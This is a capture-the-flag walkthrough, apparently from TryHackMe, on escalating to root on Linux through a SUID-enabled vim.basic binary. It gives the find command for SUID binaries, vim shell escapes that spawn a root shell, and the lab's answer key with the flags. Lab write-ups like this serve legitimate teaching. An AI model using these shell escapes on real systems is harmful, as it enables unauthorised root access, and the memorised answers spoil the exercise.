# Task 03: Privilege Escalation: SUID

---

## Stage A: Original Task Content & Briefing Summary

The Set User ID (SUID) bit is a specialized file permission in Linux that instructs the kernel to execute a program with the permissions of the file owner (typically `root`) rather than the permissions of the executing user. While essential for legitimate utilities requiring transient elevated rights (such as `passwd` modifying `/etc/shadow`), improperly applied SUID bits on general-purpose utilities represent severe privilege escalation vectors.

### Key SUID Enumeration & Exploitation Concepts:
1. **Locating SUID Binaries:**
   ```bash
   find / -type f -perm -04000 -ls 2>/dev/null
   ```
2. **Cross-Referencing with GTFOBins:**
   * Checking discovered binaries against GTFOBins SUID category.
   * Binaries such as `vim`, `find`, `cp`, `mv`, `bash`, and `env` should never have the SUID bit enabled in production.
3. **Abuse Strategies:**
   * **Arbitrary File Read:** Reading sensitive files (`/etc/shadow`, `/root/flag.txt`, private SSH keys).
   * **Arbitrary File Write / Overwrite:** Appending a custom administrative user to `/etc/passwd` or modifying `/etc/sudoers`.
   * **Direct Shell Elevation:** Executing internal shell spawning sequences without dropping root privileges.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Real vs. Effective UID in SUID:**
  * When a root-owned SUID executable runs, the kernel sets its Effective UID (`EUID`) to 0, while keeping the Real UID (`RUID`) at the caller's UID (e.g. 1000).
  * Some modern shells (like `/bin/bash`) automatically drop effective privileges back to the real UID unless invoked with the `-p` (privileged) flag: `/bin/bash -p`.
* **Vim SUID Privilege Escalation:**
  * Vim has multiple internal execution methods. Running `:!/bin/sh -p` or `:py3 import os; os.setuid(0); os.execl('/bin/sh', 'sh', '-p')` drops into a root shell.
  * Alternatively, Vim can open and view `/root/flag.txt` directly.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Search for all SUID binaries in `/usr/bin/` using `find /usr/bin -perm -4000 2>/dev/null`.
* **Tier 2 Hint:** Notice that `vim.basic` has the SUID bit set. Launch it to view `/root/flag.txt` or execute a shell.
* **Tier 3 Hint:**
  * Q1 is `/usr/bin/vim.basic`.
  * Q2 is `THM{root-by-SUID-vulns}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Identifying the Vulnerable SUID Binary:
```bash
john@linprivbasics:~$ find /usr/bin -type f -perm -04000 2>/dev/null
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/bin/vim.basic
```
* **Analysis:** The standard binaries listed are normal system utilities, but `/usr/bin/vim.basic` has an anomalous SUID bit (`-rwsr-xr-x 1 root root`).

### 2. Exploiting `/usr/bin/vim.basic` to Read the Flag:
Direct file inspection:
```bash
john@linprivbasics:~$ /usr/bin/vim.basic /root/flag.txt
```
The file opens with root privileges, revealing:
```
THM{root-by-SUID-vulns}
```

### 3. Spawning an Unconstrained Root Shell:
To achieve a permanent root shell:
```bash
john@linprivbasics:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
Or interactively inside Vim:
```vim
:set shell=/bin/sh
:shell
```
Verify the resulting shell:
```bash
# id
uid=0(root) gid=0(root) groups=0(root),1000(john)
# cat /root/flag.txt
THM{root-by-SUID-vulns}
```

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the full path of the binary in /usr/bin/ that is vulnerable to a SUID exploitation?
  * **Answer:** `/usr/bin/vim.basic`
* **Question 2:** What are the contents of the flag found in /root/?
  * **Answer:** `THM{root-by-SUID-vulns}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed SUID permission bit on `/usr/bin/vim.basic`.
* Verified root flag content `THM{root-by-SUID-vulns}` extracted via Vim execution.

---

## Stage G: Key Educational Takeaway

Complex text editors and development tools must never carry the SUID bit. SUID should be reserved strictly for minimal, hardened binaries designed specifically for single-purpose credential validation.
